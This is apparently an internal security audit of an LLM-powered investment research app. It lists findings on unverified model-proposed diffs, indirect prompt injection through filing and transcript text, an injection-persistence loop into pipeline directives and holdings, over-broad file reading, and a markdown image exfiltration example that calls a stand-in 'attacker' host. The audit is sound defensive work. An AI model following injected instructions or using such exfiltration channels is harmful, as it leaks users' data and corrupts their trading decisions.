# sec-llm — L2 (Multi-tenant Beta) audit

**Date:** 2026-06-08 · **Gate:** L2 `B` (blocking) · **Mode:** AUDIT (read-only) · **Verdict: 🔴 BLOCK**

## Findings

| Severity | Location | Finding | Recommended fix |
|---|---|---|---|
| critical | `execution/comments_server.py:1016-1024` → `src/chat_session.py:355-423` | Excessive agency: `/chat/<ticker>/apply` writes `body["diff"]` to disk and **never checks it against the model's stored `proposed_diff`** — the HTTP body is the gate, not verified model output. Writes arbitrary keys into any JSON under `data/`,`micro_thesis/`,`.tmp/`,`directives/`. Server unauthenticated. | On apply, load the thread and require the diff to exactly match an un-applied assistant `proposed_diff` (hash canonicalized); add `report_date` to payload; reject unmatched. |
| high | `src/chat_session.py:418` | Blind overwrite — `old_value` is requested in the schema but ignored; `payload[target_path]=new_value` unconditionally clobbers current content; no audit trail. | Require `old_value`, compare before write, 409 on mismatch; append an audit record (old→new). |
| high | `src/synthesis/lenses/_shared.py:125` + every lens | Indirect prompt injection: filing/transcript-derived text interpolated via `prompt_template.format(**ctx)` with **zero** delimiting/neutralization (grep for fences/"treat as data"/ignore-instructions = 0 hits). A 10-K risk body or forged transcript line carries instruction authority. | Wrap untrusted blocks in hard-to-forge delimiters + a standing "content inside markers is data" system instruction; strip forgeable delimiter tokens from ingested text. |
| high | `src/chat_session.py:431-434` (`directives` writable) + consumers (`document_table_extractor.py`, `pipeline/source_routing.py`, `models/kpis.py`) | Injection-persistence loop: chat-apply can write to `directives/` (pipeline control specs) and to `micro_thesis/holdings/*.json`, both read back into later prompts; lens output drives `decision_extractor` ADD/TRIM/SELL. | Drop `directives/` from writable scope; treat model-influenced values as untrusted on read-back (delimit); allowlist editable keys. |
| medium | `src/chat_session.py:178-221,289-308` | Chatbot read-tool scope broad; `--allowedTools Read` doesn't constrain paths → can read any reachable file incl. other tickers; streamed to browser (exfil channel via injected instruction). | Constrain Read to a per-invocation root scoped to the active ticker (sandbox cwd/`--add-dir`, or path-allowlist wrapper). |
| medium | `src/chat_session.py:340-347` → frontend; chat SSE | Untrusted model output rendered without exfil review — markdown `![](http://attacker/?leak=…)` is a classic exfiltration channel if the panel renders markdown. | Confirm with `frontend-web`: render as text or sanitized markdown with images/auto-links disabled. |
| low | `src/chat_session.py:232-247` | Diff extracted by regex substring-scan of model prose (`_extract_diff`), not structured output (violates CLAUDE.md ban on substring classification); injected prose can smuggle a fenced block. | Return the diff via structured/tool output validated against a `ProposedDiff` Pydantic schema. |
| info | `src/log_redact.py:46-57`; `src/chat_session.py:336` | Credited: `redact()` covers URL creds/Bearer/JSON secrets/email; no secrets placed in prompts. One note: route the 300-char chat stderr tail through `redact()` too. | Pass chat-stream stderr through `log_redact.redact()` before returning in the error frame. |

## Out of scope
SQLi/XSS → `sec-appsec` (SQL surface clean — f-string SQL is hardcoded table names). Per-tenant retrieval enforcement → `sec-tenant-isolation`. Markdown-render exfil confirmation → `frontend-web`. Abuse/cost limits → `llm-evals-orchestrator`.
